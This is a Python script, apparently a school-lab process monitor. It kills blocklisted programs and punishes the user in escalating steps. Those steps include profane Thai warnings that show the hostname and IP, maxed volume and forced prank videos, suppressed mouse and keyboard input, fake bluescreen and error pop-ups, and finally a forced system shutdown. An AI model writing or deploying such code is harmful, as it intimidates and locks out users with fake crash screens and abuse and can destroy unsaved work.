import psutil
from tkinter import messagebox
import socket
import webbrowser
from pynput.keyboard import Key,Controller
import time
import random
import pynput
import os
from PIL import Image,ImageSequence
from tkinter import *
keyboard = Controller()
x = 0
video = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ','https://www.youtube.com/watch?v=IyshCm8fE-g','https://www.youtube.com/watch?v=PgKcLw5HUUo','https://www.youtube.com/watch?v=Yfu6G3f8Xxc','https://www.youtube.com/shorts/J6QPB6AcSLY','https://www.youtube.com/watch?v=8ItNKJW_6Vc','https://www.youtube.com/watch?v=BizfQ1X-Sto']
def tk_popup():
    for i in range(30):
        if i % 2 == 0:
            ws = Tk()
            ws.title('มึงเสร็จกูแล้วจ้า')
            img = PhotoImage(file='error.gif')
            Label(
                ws,
                image=img
            ).pack()
            ws.mainloop()
        ws = Tk()
        ws.title('มึงเสร็จกูแล้วจ้า')
        img = PhotoImage(file='bluescreen.gif')
        Label(
            ws,
            image=img
        ).pack()
        ws.mainloop()
        keyboard_listener = pynput.keyboard.Listener(suppress=True)
        keyboard_listener.start()
    keyboard_listener.stop()
def check_ip():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    return [hostname, IPAddr]
def read_file():
    with open('block_list.txt', 'r') as f:
        return f.read().split('\n')
def check_and_kill(list_of_process_names):
    global x
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] in list_of_process_names or proc.info['pid'] in list_of_process_names:
            x+=1
            psutil.Process(proc.info['pid']).terminate()
            if x == 1:
                messagebox.showwarning('มึงเสร็จกูแล้วจ้า', '!!!!!!!!!!!!!!!\nกูเตือนมึงครั้งที่ 1\n!!!!!!!!!!!!!!!\nคอมพิวเตอร์:'+check_ip()[0] + '\nไอพี:' + check_ip()[1]+'\nมึงเปิด '+proc.info['name']+' ทำควยไร\nอาจารย์ปิดให้นะจ๊ะ')
                for i in range(50):
                    keyboard.press(Key.media_volume_up)
                    keyboard.release(Key.media_volume_up)
                    time.sleep(0.01)
                webbrowser.open(video[random.randint(0,6)])
                mouse_listener = pynput.mouse.Listener(suppress=True)
                mouse_listener.start()
                keyboard_listener = pynput.keyboard.Listener(suppress=True)
                keyboard_listener.start()
                time.sleep(15)
                mouse_listener.stop()
                keyboard_listener.stop()
            elif x == 2:
                tk_popup()
            elif x == 3:
                messagebox.showwarning('มึงเสร็จกูแล้วจ้า', '!!!!!!!!!!!!!!!\nลาก่อน ไอ้เด็กเชี่ย\n!!!!!!!!!!!!!!!')
                webbrowser.open('https://www.youtube.com/watch?v=0_CDMstFg7M')
                mouse_listener = pynput.mouse.Listener(suppress=True)
                mouse_listener.start()
                keyboard_listener = pynput.keyboard.Listener(suppress=True)
                keyboard_listener.start()
                time.sleep(12)
                os.system("shutdown /s /t 1") 
while True:
    check_and_kill(read_file())
